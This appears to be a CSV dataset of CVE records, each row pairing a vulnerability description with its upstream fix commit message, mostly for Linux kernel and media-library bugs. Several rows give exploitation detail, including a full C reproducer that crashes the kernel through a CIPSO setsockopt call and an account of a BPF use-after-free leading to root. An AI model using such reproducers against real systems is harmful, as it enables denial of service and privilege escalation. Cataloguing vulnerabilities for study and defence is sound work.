CVE-2017-17853,CWE-119,2017-12-27,kernel/bpf/verifier.c in the Linux kernel through 4.14.8 allows local users to cause a denial of service (memory corruption) or possibly have unspecified other impact by leveraging incorrect BPF_RSH signed bounds calculations.,"Incorrect signed bounds were being computed. If the old upper signed bound was positive and the old lower signed bound was negative, this could cause the new upper signed bound to be too low, leading to security issues.  Fixes: b03c9f9 (""bpf/verifier: track signed and unsigned min/max values"") Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Edward Cree <ecree@solarflare.com> Acked-by: Alexei Starovoitov <ast@kernel.org> [jannh@google.com: changed description to reflect bug impact] Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Alexei Starovoitov <ast@kernel.org> Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>"
CVE-2017-16805,CWE-125,2017-11-13,"In radare2 2.0.1, libr/bin/dwarf.c allows remote attackers to cause a denial of service (invalid read and application crash) via a crafted ELF file, related to r_bin_dwarf_parse_comp_unit in dwarf.c and sdb_set_internal in shlr/sdb/src/sdb.c.",
CVE-2017-18249,CWE-362,2018-03-26,"The add_free_nid function in fs/f2fs/node.c in the Linux kernel before 4.12 does not properly track an allocated nid, which allows local users to cause a denial of service (race condition) or possibly have unspecified other impact via concurrent threads.","In below concurrent case, allocated nid can be loaded into free nid cache and be allocated again.  Thread A				Thread B - f2fs_create  - f2fs_new_inode   - alloc_nid    - __insert_nid_to_list(ALLOC_NID_LIST) 					- f2fs_balance_fs_bg 					 - build_free_nids 					  - __build_free_nids 					   - scan_nat_page 					    - add_free_nid 					     - __lookup_nat_cache  - f2fs_add_link   - init_inode_metadata    - new_inode_page     - new_node_page      - set_node_addr  - alloc_nid_done   - __remove_nid_from_list(ALLOC_NID_LIST) 					     - __insert_nid_to_list(FREE_NID_LIST)  This patch makes nat cache lookup and free nid list operation being atomical to avoid this race condition.  Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org> Signed-off-by: Chao Yu <yuchao0@huawei.com> Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>"
CVE-2017-10663,CWE-129,2017-08-19,"The sanity_check_ckpt function in fs/f2fs/super.c in the Linux kernel before 4.12.4 does not validate the blkoff and segno arrays, which allows local users to gain privileges via unspecified vectors.",Make sure segno and blkoff read from raw image are valid.  Cc: stable@vger.kernel.org Signed-off-by: Jin Qian <jinqian@google.com> [Jaegeuk Kim: adjust minor coding style] Signed-off-by: Jaegeuk Kim <jaegeuk@kernel.org>
CVE-2013-2017,CWE-399,2013-05-03,"The veth (aka virtual Ethernet) driver in the Linux kernel before 2.6.34 does not properly manage skbs during congestion, which allows remote attackers to cause a denial of service (system crash) by leveraging lack of skb consumption in conjunction with a double-free error.","In case of congestion, netif_rx() frees the skb, so we must assume dev_forward_skb() also consume skb.  Bug introduced by commit 4454096 (veth: move loopback logic to common location)  We must change dev_forward_skb() to always consume skb, and veth to not double free it.  Bug report : http://marc.info/?l=linux-netdev&m=127310770900442&w=3  Reported-by: Martín Ferrari <martin.ferrari@gmail.com> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-6430,CWE-125,2017-03-15,The compile_tree function in ef_compiler.c in the Etterfilter utility in Ettercap 0.8.2 and earlier allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted filter.,
CVE-2016-10145,CWE-189,2017-03-24,Off-by-one error in coders/wpg.c in ImageMagick allows remote attackers to have unspecified impact via vectors related to a string copy.,
CVE-2012-6537,CWE-200,2013-03-15,"net/xfrm/xfrm_user.c in the Linux kernel before 3.6 does not initialize certain structures, which allows local users to obtain sensitive information from kernel memory by leveraging the CAP_NET_ADMIN capability.",The memory reserved to dump the xfrm policy includes multiple padding bytes added by the compiler for alignment (padding bytes in struct xfrm_selector and struct xfrm_userpolicy_info). Add an explicit memset(0) before filling the buffer to avoid the heap info leak.  Signed-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>
CVE-2018-8787,CWE-190,2018-11-29,FreeRDP prior to version 2.0.0-rc4 contains an Integer Overflow that leads to a Heap-Based Buffer Overflow in function gdi_Bitmap_Decompress() and results in a memory corruption and probably even a remote code execution.,Thanks to Eyal Itkin from Check Point Software Technologies.
CVE-2018-7492,CWE-476,2018-02-26,"A NULL pointer dereference was found in the net/rds/rdma.c __rds_rdma_map() function in the Linux kernel before 4.14.7 allowing local attackers to cause a system panic and a denial-of-service, related to RDS_GET_MR and RDS_GET_MR_FOR_DEST.","This is a fix for syzkaller719569, where memory registration was attempted without any underlying transport being loaded.  Analysis of the case reveals that it is the setsockopt() RDS_GET_MR (2) and RDS_GET_MR_FOR_DEST (7) that are vulnerable.  Here is an example stack trace when the bug is hit:  BUG: unable to handle kernel NULL pointer dereference at 00000000000000c0 IP: __rds_rdma_map+0x36/0x440 [rds] PGD 2f93d03067 P4D 2f93d03067 PUD 2f93d02067 PMD 0 Oops: 0000 [#1] SMP Modules linked in: bridge stp llc tun rpcsec_gss_krb5 nfsv4 dns_resolver nfs fscache rds binfmt_misc sb_edac intel_powerclamp coretemp kvm_intel kvm irqbypass crct10dif_pclmul c rc32_pclmul ghash_clmulni_intel pcbc aesni_intel crypto_simd glue_helper cryptd iTCO_wdt mei_me sg iTCO_vendor_support ipmi_si mei ipmi_devintf nfsd shpchp pcspkr i2c_i801 ioatd ma ipmi_msghandler wmi lpc_ich mfd_core auth_rpcgss nfs_acl lockd grace sunrpc ip_tables ext4 mbcache jbd2 mgag200 i2c_algo_bit drm_kms_helper ixgbe syscopyarea ahci sysfillrect sysimgblt libahci mdio fb_sys_fops ttm ptp libata sd_mod mlx4_core drm crc32c_intel pps_core megaraid_sas i2c_core dca dm_mirror dm_region_hash dm_log dm_mod CPU: 48 PID: 45787 Comm: repro_set2 Not tainted 4.14.2-3.el7uek.x86_64 #2 Hardware name: Oracle Corporation ORACLE SERVER X5-2L/ASM,MOBO TRAY,2U, BIOS 31110000 03/03/2017 task: ffff882f9190db00 task.stack: ffffc9002b994000 RIP: 0010:__rds_rdma_map+0x36/0x440 [rds] RSP: 0018:ffffc9002b997df0 EFLAGS: 00010202 RAX: 0000000000000000 RBX: ffff882fa2182580 RCX: 0000000000000000 RDX: 0000000000000000 RSI: ffffc9002b997e40 RDI: ffff882fa2182580 RBP: ffffc9002b997e30 R08: 0000000000000000 R09: 0000000000000002 R10: ffff885fb29e3838 R11: 0000000000000000 R12: ffff882fa2182580 R13: ffff882fa2182580 R14: 0000000000000002 R15: 0000000020000ffc FS:  00007fbffa20b700(0000) GS:ffff882fbfb80000(0000) knlGS:0000000000000000 CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033 CR2: 00000000000000c0 CR3: 0000002f98a66006 CR4: 00000000001606e0 Call Trace:  rds_get_mr+0x56/0x80 [rds]  rds_setsockopt+0x172/0x340 [rds]  ? __fget_light+0x25/0x60  ? __fdget+0x13/0x20  SyS_setsockopt+0x80/0xe0  do_syscall_64+0x67/0x1b0  entry_SYSCALL64_slow_path+0x25/0x25 RIP: 0033:0x7fbff9b117f9 RSP: 002b:00007fbffa20aed8 EFLAGS: 00000293 ORIG_RAX: 0000000000000036 RAX: ffffffffffffffda RBX: 00000000000c84a4 RCX: 00007fbff9b117f9 RDX: 0000000000000002 RSI: 0000400000000114 RDI: 000000000000109b RBP: 00007fbffa20af10 R08: 0000000000000020 R09: 00007fbff9dd7860 R10: 0000000020000ffc R11: 0000000000000293 R12: 0000000000000000 R13: 00007fbffa20b9c0 R14: 00007fbffa20b700 R15: 0000000000000021  Code: 41 56 41 55 49 89 fd 41 54 53 48 83 ec 18 8b 87 f0 02 00 00 48 89 55 d0 48 89 4d c8 85 c0 0f 84 2d 03 00 00 48 8b 87 00 03 00 00 <48> 83 b8 c0 00 00 00 00 0f 84 25 03 00 0 0 48 8b 06 48 8b 56 08  The fix is to check the existence of an underlying transport in __rds_rdma_map().  Signed-off-by: Håkon Bugge <haakon.bugge@oracle.com> Reported-by: syzbot <syzkaller@googlegroups.com> Acked-by: Santosh Shilimkar <santosh.shilimkar@oracle.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-7141,CWE-287,2016-10-03,"curl and libcurl before 7.50.2, when built with NSS and the libnsspem.so library is available at runtime, allow remote attackers to hijack the authentication of a TLS connection by leveraging reuse of a previously loaded client certificate from file for a connection for which no certificate has been set, a different vulnerability than CVE-2016-5420.",... when we are not asked to use a certificate from file
CVE-2016-7035,CWE-285,2018-09-10,"An authorization flaw was found in Pacemaker before 1.1.16, where it did not properly guard its IPC interface. An attacker with an unprivileged account on a Pacemaker node could use this flaw to, for example, force the Local Resource Manager daemon to execute a script as root and thereby gain root access on the machine.","It was discovered that at some not so uncommon circumstances, some pacemaker daemons could be talked to, via libqb-facilitated IPC, by unprivileged clients due to flawed authorization decision.  Depending on the capabilities of affected daemons, this might equip unauthorized user with local privilege escalation or up to cluster-wide remote execution of possibly arbitrary commands when such user happens to reside at standard or remote/guest cluster node, respectively.  The original vulnerability was introduced in an attempt to allow unprivileged IPC clients to clean up the file system materialized leftovers in case the server (otherwise responsible for the lifecycle of these files) crashes.  While the intended part of such behavior is now effectively voided (along with the unintended one), a best-effort fix to address this corner case systemically at libqb is coming along (ClusterLabs/libqb#231).  Affected versions:  1.1.10-rc1 (2013-04-17) - 1.1.15 (2016-06-21) Impact:             Important CVSSv3 ranking:     8.8 : AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H  Credits for independent findings, in chronological order:   Jan ""poki"" Pokorný, of Red Hat   Alain Moulle, of ATOS/BULL"
CVE-2018-14395,CWE-369,2018-07-19,libavformat/movenc.c in FFmpeg 3.2 and 4.0.2 allows attackers to cause a denial of service (application crash caused by a divide-by-zero error) with a user crafted audio file when converting to the MOV audio format.,The version 1 needs the channel count and would divide by 0 Fixes: division by 0 Fixes: fpe_movenc.c_1108_1.ogg Fixes: fpe_movenc.c_1108_2.ogg Fixes: fpe_movenc.c_1108_3.wav  Found-by: #CHEN HONGXU# <HCHEN017@e.ntu.edu.sg> Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>
CVE-2013-7281,CWE-200,2014-01-08,"The dgram_recvmsg function in net/ieee802154/dgram.c in the Linux kernel before 3.12.4 updates a certain length value without ensuring that an associated data structure has been initialized, which allows local users to obtain sensitive information from kernel stack memory via a (1) recvfrom, (2) recvmmsg, or (3) recvmsg system call.","Only update *addr_len when we actually fill in sockaddr, otherwise we can return uninitialized memory from the stack to the caller in the recvfrom, recvmmsg and recvmsg syscalls. Drop the the (addr_len == NULL) checks because we only get called with a valid addr_len pointer either from sock_common_recvmsg or inet_recvmsg.  If a blocking read waits on a socket which is concurrently shut down we now return zero and set msg_msgnamelen to 0.  Reported-by: mpb <mpb.mail@gmail.com> Suggested-by: Eric Dumazet <eric.dumazet@gmail.com> Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-11449,,2017-07-19,"coders/mpc.c in ImageMagick before 7.0.6-1 does not enable seekable streams and thus cannot validate blob sizes, which allows remote attackers to cause a denial of service (application crash) or possibly have unspecified other impact via an image received from stdin.",
CVE-2017-14041,CWE-787,2017-08-30,"A stack-based buffer overflow was discovered in the pgxtoimage function in bin/jp2/convert.c in OpenJPEG 2.2.0. The vulnerability causes an out-of-bounds write, which may lead to remote denial of service or possibly remote code execution.",
CVE-2016-9262,CWE-190,2017-03-23,"Multiple integer overflows in the (1) jas_realloc function in base/jas_malloc.c and (2) mem_resize function in base/jas_stream.c in JasPer before 1.900.22 allow remote attackers to cause a denial of service via a crafted image, which triggers use after free vulnerabilities.","There were a number of potential problems due to the possibility of integer overflow. Changed some integral types to the larger types size_t or ssize_t. For example, the function mem_resize now takes the buffer size parameter as a size_t. Added a new function jas_stream_memopen2, which takes a buffer size specified as a size_t instead of an int. This can be used in jas_image_cmpt_create to avoid potential overflow problems.  Added a new function jas_deprecated to warn about reliance on deprecated library behavior."
CVE-2018-17294,CWE-125,2018-09-21,"The matchCurrentInput function inside lou_translateString.c of Liblouis prior to 3.7 does not check the input string's length, allowing attackers to cause a denial of service (application crash via out-of-bounds read) by crafting an input file with certain translation dictionaries.",Fixes #635  Thanks to HongxuChen for reporting it
CVE-2013-0349,CWE-200,2013-02-28,"The hidp_setup_hid function in net/bluetooth/hidp/core.c in the Linux kernel before 3.7.6 does not properly copy a certain name field, which allows local users to obtain sensitive information from kernel memory by setting a long name and making an HIDPCONNADD ioctl call.","The length parameter should be sizeof(req->name) - 1 because there is no guarantee that string provided by userspace will contain the trailing '\0'.  Can be easily reproduced by manually setting req->name to 128 non-zero bytes prior to ioctl(HIDPCONNADD) and checking the device name setup on input subsystem:  $ cat /sys/devices/pnp0/00\:04/tty/ttyS0/hci0/hci0\:1/input8/name AAAAAA[...]AAAAAAAAf0:af:f0:af:f0:af  (""f0:af:f0:af:f0:af"" is the device bluetooth address, taken from ""phys"" field in struct hid_device due to overflow.)  Cc: stable@vger.kernel.org Signed-off-by: Anderson Lizardo <anderson.lizardo@openbossa.org> Acked-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: Gustavo Padovan <gustavo.padovan@collabora.co.uk>"
CVE-2011-1182,,2013-03-01,kernel/signal.c in the Linux kernel before 2.6.39 allows local users to spoof the uid and pid of a signal sender via a sigqueueinfo system call.,"Userland should be able to trust the pid and uid of the sender of a signal if the si_code is SI_TKILL.  Unfortunately, the kernel has historically allowed sigqueueinfo() to send any si_code at all (as long as it was negative - to distinguish it from kernel-generated signals like SIGILL etc), so it could spoof a SI_TKILL with incorrect siginfo values.  Happily, it looks like glibc has always set si_code to the appropriate SI_QUEUE, so there are probably no actual user code that ever uses anything but the appropriate SI_QUEUE flag.  So just tighten the check for si_code (we used to allow any negative value), and add a (one-time) warning in case there are binaries out there that might depend on using other si_code values.  Signed-off-by: Julien Tinnes <jln@google.com> Acked-by: Oleg Nesterov <oleg@redhat.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2017-3730,CWE-476,2017-05-04,"In OpenSSL 1.1.0 before 1.1.0d, if a malicious server supplies bad parameters for a DHE or ECDHE key exchange then this can result in the client attempting to dereference a NULL pointer leading to a client crash. This could be exploited in a Denial of Service attack.",Reviewed-by: Rich Salz <rsalz@openssl.org>
CVE-2017-15868,CWE-20,2017-12-05,"The bnep_add_connection function in net/bluetooth/bnep/core.c in the Linux kernel before 3.19 does not ensure that an l2cap socket is available, which allows local users to gain privileges via a crafted application.",same story as cmtp  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk> Signed-off-by: Marcel Holtmann <marcel@holtmann.org>
CVE-2017-7533,CWE-362,2017-08-05,Race condition in the fsnotify implementation in the Linux kernel through 4.12.4 allows local users to gain privileges or cause a denial of service (memory corruption) via a crafted application that leverages simultaneous execution of the inotify_handle_event and vfs_rename functions.,"take_dentry_name_snapshot() takes a safe snapshot of dentry name; if the name is a short one, it gets copied into caller-supplied structure, otherwise an extra reference to external name is grabbed (those are never modified).  In either case the pointer to stable string is stored into the same structure.  dentry must be held by the caller of take_dentry_name_snapshot(), but may be freely dropped afterwards - the snapshot will stay until destroyed by release_dentry_name_snapshot().  Intended use: 	struct name_snapshot s;  	take_dentry_name_snapshot(&s, dentry); 	... 	access s.name 	... 	release_dentry_name_snapshot(&s);  Replaces fsnotify_oldname_...(), gets used in fsnotify to obtain the name to pass down with event.  Signed-off-by: Al Viro <viro@zeniv.linux.org.uk>"
CVE-2017-13689,CWE-125,2017-09-14,The IKEv1 parser in tcpdump before 4.9.2 has a buffer over-read in print-isakmp.c:ikev1_id_print().,"An IPv6 address plus subnet mask is 32 bytes, not 20 bytes. 16 bytes of IPv6 address, 16 bytes of subnet mask.  This fixes a buffer over-read discovered by Bhargava Shastry, SecT/TU Berlin.  Add a test using the capture file supplied by the reporter(s)."
CVE-2019-11487,CWE-416,2019-04-23,"The Linux kernel before 5.1-rc5 allows page->_refcount reference count overflow, with resultant use-after-free issues, if about 140 GiB of RAM exists. This is related to fs/fuse/dev.c, fs/pipe.c, fs/splice.c, include/linux/mm.h, include/linux/pipe_fs_i.h, kernel/trace/trace.c, mm/gup.c, and mm/hugetlb.c. It can occur with FUSE requests.",Change pipe_buf_get() to return a bool indicating whether it succeeded in raising the refcount of the page (if the thing in the pipe is a page). This removes another mechanism for overflowing the page refcount.  All callers converted to handle a failure.  Reported-by: Jann Horn <jannh@google.com> Signed-off-by: Matthew Wilcox <willy@infradead.org> Cc: stable@kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>
CVE-2018-11594,CWE-119,2018-05-31,"Espruino before 1.99 allows attackers to cause a denial of service (application crash) with a user crafted input file via a Buffer Overflow during syntax parsing of ""VOID"" tokens in jsparse.c.",
CVE-2016-2185,,2016-05-02,The ati_remote2_probe function in drivers/input/misc/ati_remote2.c in the Linux kernel before 4.5.1 allows physically proximate attackers to cause a denial of service (NULL pointer dereference and system crash) via a crafted endpoints value in a USB device descriptor.,"The ati_remote2 driver expects at least two interfaces with one endpoint each. If given malicious descriptor that specify one interface or no endpoints, it will crash in the probe function. Ensure there is at least two interfaces and one endpoint for each interface before using it.  The full disclosure: http://seclists.org/bugtraq/2016/Mar/90  Reported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>"
CVE-2013-4270,CWE-20,2013-12-09,"The net_ctl_permissions function in net/sysctl_net.c in the Linux kernel before 3.11.5 does not properly determine uid and gid values, which allows local users to bypass intended /proc/sys/net restrictions via a crafted application.","Modify the code to use current_euid(), and in_egroup_p, as in done in fs/proc/proc_sysctl.c:test_perm()  Cc: stable@vger.kernel.org Reviewed-by: Eric Sandeen <sandeen@redhat.com> Reported-by: Eric Sandeen <sandeen@redhat.com> Signed-off-by: ""Eric W. Biederman"" <ebiederm@xmission.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>"
CVE-2016-4482,CWE-200,2016-05-23,"The proc_connectinfo function in drivers/usb/core/devio.c in the Linux kernel through 4.6 does not initialize a certain data structure, which allows local users to obtain sensitive information from kernel stack memory via a crafted USBDEVFS_CONNECTINFO ioctl call.",The stack object “ci” has a total size of 8 bytes. Its last 3 bytes are padding bytes which are not initialized and leaked to userland via “copy_to_user”.  Signed-off-by: Kangjie Lu <kjlu@gatech.edu> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>
CVE-2013-7012,CWE-119,2013-12-09,"The get_siz function in libavcodec/jpeg2000dec.c in FFmpeg before 2.1 does not prevent attempts to use non-zero image offsets, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted JPEG2000 data.",Fixes out of array accesses Fixes Ticket3080 Found-by: ami_stuff Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2018-20102,CWE-125,2018-12-12,"An out-of-bounds read in dns_validate_dns_response in dns.c was discovered in HAProxy through 1.8.14. Due to a missing check when validating DNS responses, remote attackers might be able read the 16 bytes corresponding to an AAAA record from the non-initialized part of the buffer, possibly accessing anything that was left on the stack, or even past the end of the 8193-byte buffer, depending on the value of accepted_payload_size.",
CVE-2017-7418,CWE-59,2017-04-04,"ProFTPD before 1.3.5e and 1.3.6 before 1.3.6rc5 controls whether the home directory of a user could contain a symbolic link through the AllowChrootSymlinks configuration option, but checks only the last path component when enforcing AllowChrootSymlinks. Attackers with local access could bypass the AllowChrootSymlinks control by replacing a path component (other than the last one) with a symbolic link. The threat model includes an attacker who is not granted full filesystem access by a hosting provider, but can reconfigure the home directory of an FTP user.","is off, to 1.3.5 branch."
CVE-2013-4263,CWE-119,2013-11-23,"libavfilter in FFmpeg before 2.0.1 has unspecified impact and remote vectors related to a crafted ""plane,"" which triggers an out-of-bounds heap write.",Fixes out of array accesses  Signed-off-by: Michael Niedermayer <michaelni@gmx.at>
CVE-2017-13004,CWE-125,2017-09-14,The Juniper protocols parser in tcpdump before 4.9.2 has a buffer over-read in print-juniper.c:juniper_parse_header().,This fixes a buffer over-read discovered by Forcepoint's security researchers Otto Airamo & Antti Levomäki.  Add tests using the capture files supplied by the reporter(s).
CVE-2013-7456,CWE-125,2016-08-07,"gd_interpolation.c in the GD Graphics Library (aka libgd) before 2.1.1, as used in PHP before 5.5.36, 5.6.x before 5.6.22, and 7.x before 7.0.7, allows remote attackers to cause a denial of service (out-of-bounds read) or possibly have unspecified other impact via a crafted image that is mishandled by the imagescale function.",Ported from libgd/libgd@4f65a3e
CVE-2016-9933,CWE-119,2017-01-04,"Stack consumption vulnerability in the gdImageFillToBorder function in gd.c in the GD Graphics Library (aka libgd) before 2.2.2, as used in PHP before 5.6.28 and 7.x before 7.0.13, allows remote attackers to cause a denial of service (segmentation violation) via a crafted imagefilltoborder call that triggers use of a negative color value.","We must not allow negative color values be passed to gdImageFillToBorder(), because that can lead to infinite recursion since the recursion termination condition will not necessarily be met."
CVE-2018-0734,CWE-327,2018-10-30,The OpenSSL DSA signature algorithm has been shown to be vulnerable to a timing side channel attack. An attacker could use variations in the signing algorithm to recover the private key. Fixed in OpenSSL 1.1.1a (Affected 1.1.1). Fixed in OpenSSL 1.1.0j (Affected 1.1.0-1.1.0i). Fixed in OpenSSL 1.0.2q (Affected 1.0.2-1.0.2p).,
CVE-2015-0293,CWE-20,2015-03-19,"The SSLv2 implementation in OpenSSL before 0.9.8zf, 1.0.0 before 1.0.0r, 1.0.1 before 1.0.1m, and 1.0.2 before 1.0.2a allows remote attackers to cause a denial of service (s2_lib.c assertion failure and daemon exit) via a crafted CLIENT-MASTER-KEY message.",
CVE-2016-10052,CWE-119,2017-03-23,Buffer overflow in the WriteProfile function in coders/jpeg.c in ImageMagick before 6.9.5-6 allows remote attackers to cause a denial of service (application crash) or have other unspecified impact via a crafted file.,
CVE-2013-0310,CWE-119,2013-02-22,The cipso_v4_validate function in net/ipv4/cipso_ipv4.c in the Linux kernel before 3.4.8 allows local users to cause a denial of service (NULL pointer dereference and system crash) or possibly have unspecified other impact via an IPOPT_CIPSO IP_OPTIONS setsockopt system call.,"As reported by Alan Cox, and verified by Lin Ming, when a user attempts to add a CIPSO option to a socket using the CIPSO_V4_TAG_LOCAL tag the kernel dies a terrible death when it attempts to follow a NULL pointer (the skb argument to cipso_v4_validate() is NULL when called via the setsockopt() syscall).  This patch fixes this by first checking to ensure that the skb is non-NULL before using it to find the incoming network interface.  In the unlikely case where the skb is NULL and the user attempts to add a CIPSO option with the _TAG_LOCAL tag we return an error as this is not something we want to allow.  A simple reproducer, kindly supplied by Lin Ming, although you must have the CIPSO DOI #3 configure on the system first or you will be caught early in cipso_v4_validate():  	#include <sys/types.h> 	#include <sys/socket.h> 	#include <linux/ip.h> 	#include <linux/in.h> 	#include <string.h>  	struct local_tag { 		char type; 		char length; 		char info[4]; 	};  	struct cipso { 		char type; 		char length; 		char doi[4]; 		struct local_tag local; 	};  	int main(int argc, char **argv) 	{ 		int sockfd; 		struct cipso cipso = { 			.type = IPOPT_CIPSO, 			.length = sizeof(struct cipso), 			.local = { 				.type = 128, 				.length = sizeof(struct local_tag), 			}, 		};  		memset(cipso.doi, 0, 4); 		cipso.doi[3] = 3;  		sockfd = socket(AF_INET, SOCK_DGRAM, 0); 		#define SOL_IP 0 		setsockopt(sockfd, SOL_IP, IP_OPTIONS, 			&cipso, sizeof(struct cipso));  		return 0; 	}  CC: Lin Ming <mlin@ss.pku.edu.cn> Reported-by: Alan Cox <alan@lxorguk.ukuu.org.uk> Signed-off-by: Paul Moore <pmoore@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2016-9583,CWE-125,2018-08-01,An out-of-bounds heap read vulnerability was found in the jpc_pi_nextpcrl() function of jasper before 2.0.6 when processing crafted input.,in the JPC decoder.
CVE-2017-6890,CWE-119,2017-05-15,"A boundary error within the ""foveon_load_camf()"" function (dcraw_foveon.c) when initializing a huffman table in LibRaw-demosaic-pack-GPL2 before 0.18.2 can be exploited to cause a stack-based buffer overflow.",
CVE-2018-17206,CWE-125,2018-09-19,An issue was discovered in Open vSwitch (OvS) 2.7.x through 2.7.6. The decode_bundle function inside lib/ofp-actions.c is affected by a buffer over-read issue during BUNDLE action decoding.,Reported-at: https://bugs.chromium.org/p/oss-fuzz/issues/detail?id=9052 Signed-off-by: Ben Pfaff <blp@ovn.org> Acked-by: Justin Pettit <jpettit@ovn.org>
CVE-2012-2121,CWE-264,2012-05-17,"The KVM implementation in the Linux kernel before 3.3.4 does not properly manage the relationships between memory slots and the iommu, which allows guest OS users to cause a denial of service (memory leak and host OS crash) by leveraging administrative access to the guest OS to conduct hotunplug and hotplug operations on devices.","commit 32f6daa upstream.  We've been adding new mappings, but not destroying old mappings. This can lead to a page leak as pages are pinned using get_user_pages, but only unpinned with put_page if they still exist in the memslots list on vm shutdown.  A memslot that is destroyed while an iommu domain is enabled for the guest will therefore result in an elevated page reference count that is never cleared.  Additionally, without this fix, the iommu is only programmed with the first translation for a gpa.  This can result in peer-to-peer errors if a mapping is destroyed and replaced by a new mapping at the same gpa as the iommu will still be pointing to the original, pinned memory address.  Signed-off-by: Alex Williamson <alex.williamson@redhat.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>"
CVE-2010-5313,CWE-362,2014-11-30,"Race condition in arch/x86/kvm/x86.c in the Linux kernel before 2.6.38 allows L2 guest OS users to cause a denial of service (L1 guest OS crash) via a crafted instruction that triggers an L2 emulation failure report, a similar issue to CVE-2014-7842.",This patch prevents that emulation failures which result from emulating an instruction for an L2-Guest results in being reported to userspace. Without this patch a malicious L2-Guest would be able to kill the L1 by triggering a race-condition between an vmexit and the instruction emulator. With this patch the L2 will most likely only kill itself in this situation.  Signed-off-by: Joerg Roedel <joerg.roedel@amd.com> Signed-off-by: Marcelo Tosatti <mtosatti@redhat.com>
CVE-2018-12458,CWE-20,2018-06-15,"An improper integer type in the mpeg4_encode_gop_header function in libavcodec/mpeg4videoenc.c in FFmpeg 2.8 and 4.0 may trigger an assertion violation while converting a crafted AVI file to MPEG4, leading to a denial of service.","Fixes truncation Fixes Assertion n <= 31 && value < (1U << n) failed at libavcodec/put_bits.h:169 Fixes: ffmpeg_crash_2.avi  Found-by: Thuan Pham <thuanpv@comp.nus.edu.sg>, Marcel Böhme, Andrew Santosa and Alexandru RazvanCaciulescu with AFLSmart  Signed-off-by: Michael Niedermayer <michael@niedermayer.cc>"
CVE-2016-4557,,2016-05-23,"The replace_map_fd_with_map_ptr function in kernel/bpf/verifier.c in the Linux kernel before 4.5.5 does not properly maintain an fd data structure, which allows local users to gain privileges or cause a denial of service (use-after-free) via crafted BPF instructions that reference an incorrect file descriptor.","When bpf(BPF_PROG_LOAD, ...) was invoked with a BPF program whose bytecode references a non-map file descriptor as a map file descriptor, the error handling code called fdput() twice instead of once (in __bpf_map_get() and in replace_map_fd_with_map_ptr()). If the file descriptor table of the current task is shared, this causes f_count to be decremented too much, allowing the struct file to be freed while it is still in use (use-after-free). This can be exploited to gain root privileges by an unprivileged user.  This bug was introduced in commit 0246e64 (""bpf: handle pseudo BPF_LD_IMM64 insn""), but is only exploitable since commit 1be7f75 (""bpf: enable non-root eBPF programs"") because previously, CAP_SYS_ADMIN was required to reach the vulnerable code.  (posted publicly according to request by maintainer)  Signed-off-by: Jann Horn <jannh@google.com> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org> Acked-by: Alexei Starovoitov <ast@kernel.org> Acked-by: Daniel Borkmann <daniel@iogearbox.net> Signed-off-by: David S. Miller <davem@davemloft.net>"
CVE-2017-10810,CWE-772,2017-07-04,Memory leak in the virtio_gpu_object_create function in drivers/gpu/drm/virtio/virtgpu_object.c in the Linux kernel through 4.11.8 allows attackers to cause a denial of service (memory consumption) by triggering object-initialization failures.,Reported-by: 李强 <liqiang6-s@360.cn> Signed-off-by: Gerd Hoffmann <kraxel@redhat.com> Link: http://patchwork.freedesktop.org/patch/msgid/20170406155941.458-1-kraxel@redhat.com
CVE-2014-0207,CWE-119,2014-07-09,"The cdf_read_short_sector function in cdf.c in file before 5.19, as used in the Fileinfo component in PHP before 5.4.30 and 5.5.x before 5.5.14, allows remote attackers to cause a denial of service (assertion failure and application exit) via a crafted CDF file.","From Francisco Alonso Espejo:     file < 5.18/git version can be made to crash when checking some     corrupt CDF files (Using an invalid cdf_read_short_sector size)     The problem I found here, is that in most situations (if     h_short_sec_size_p2 > 8) because the blocksize is 512 and normal     values are 06 which means reading 64 bytes.As long as the check     for the block size copy is not checked properly (there's an assert     that makes wrong/invalid assumptions)"
CVE-2017-12858,CWE-415,2017-08-23,Double free vulnerability in the _zip_dirent_read function in zip_dirent.c in libzip allows attackers to have unspecified impact via unknown vectors.,Found by Brian 'geeknik' Carpenter using AFL.
CVE-2016-7529,CWE-125,2017-04-19,coders/xcf.c in ImageMagick allows remote attackers to cause a denial of service (out-of-bounds read) via a crafted XCF file.,
CVE-2018-20762,CWE-119,2019-02-06,GPAC version 0.7.1 and earlier has a buffer overflow vulnerability in the cat_multiple_files function in applications/mp4box/fileimport.c when MP4Box is used for a local directory containing crafted filenames.,"fixes #1184, #1186, #1187 among other things"
